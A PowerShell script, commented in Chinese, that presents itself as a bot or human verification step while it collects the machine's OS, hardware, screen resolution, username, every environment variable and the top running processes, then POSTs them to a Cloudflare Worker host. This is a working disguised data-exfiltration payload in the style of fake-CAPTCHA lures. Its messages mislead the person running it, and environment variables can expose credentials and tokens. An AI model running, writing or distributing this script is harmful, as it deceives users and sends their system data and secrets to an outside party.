param(
    [Parameter(Mandatory=$true, HelpMessage="错误")]
    [string]$key
)

# 将 key 进行 URL 编码（防止特殊字符导致问题）
$encodedKey = [System.Net.WebUtility]::UrlEncode($key)

# Cloudflare Worker 的 URL（请替换为你的 Worker 域名）
$baseUrl = "https://go.panda443212.workers.dev"

# 定义 /c 和 /u 接口的完整 URL
$cUrl = "$baseUrl/c?key=$encodedKey"
$uUrl = "$baseUrl/u?key=$encodedKey"

# 调用 /c 接口创建 KV 键
try {
    $cResponse = Invoke-RestMethod -Uri $cUrl -Method GET
    Write-Output "验证是否是机器人中... $cResponse"
} catch {
    Write-Output "失败... $_"
    exit 1
}

# 获取操作系统版本
$osVersion = (Get-WmiObject Win32_OperatingSystem).Caption

# 获取 CPU 信息
$cpu = Get-WmiObject Win32_Processor | Select-Object -First 1
$cpuUsage = (Get-Counter "\Processor(_Total)\% Processor Time").CounterSamples.CookedValue

# 获取内存信息
$memInfo = Get-WmiObject Win32_PhysicalMemory
$totalMemory = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
$usedMemory = [math]::Round($totalMemory - ((Get-CimInstance Win32_OperatingSystem).FreePhysicalMemory / 1MB), 2)

# 获取显卡信息（如果有）
$gpuInfo = Get-WmiObject Win32_VideoController | Select-Object -First 1
$gpuName = $gpuInfo.Name
$gpuMemory = [math]::Round($gpuInfo.AdapterRAM / 1GB, 2)

# 获取屏幕分辨率
$screenWidth = (Get-WmiObject Win32_VideoController).CurrentHorizontalResolution
$screenHeight = (Get-WmiObject Win32_VideoController).CurrentVerticalResolution
$resolution = "$screenWidth x $screenHeight"

# 获取当前用户名
$username = $env:USERNAME

# 获取环境变量
$envVariables = Get-ChildItem Env: | ForEach-Object { @{ Name = $_.Name; Value = $_.Value } }

# 获取当前进程列表
$processList = Get-Process | Select-Object Name, Id, CPU, WorkingSet | Sort-Object CPU -Descending | Select-Object -First 10

# 构造 JSON 数据
$systemData = @{
    osVersion    = $osVersion
    cpu          = @{ name = $cpu.Name; usage = [math]::Round($cpuUsage, 2) }
    memory       = @{ totalGB = $totalMemory; usedGB = $usedMemory; details = $memInfo.Manufacturer }
    gpu          = @{ name = $gpuName; memoryGB = $gpuMemory }
    resolution   = $resolution
    username     = $username
    envVariables = $envVariables
    processes    = $processList
}

# 转换为 JSON
$jsonPayload = $systemData | ConvertTo-Json -Depth 3

# 上传数据到 Cloudflare Worker
try {
    $uResponse = Invoke-RestMethod -Uri $uUrl -Method POST -Body $jsonPayload -ContentType "application/json"
    Write-Output "验证成功... $uResponse"
} catch {
    Write-Output "验证失败: $_"
}
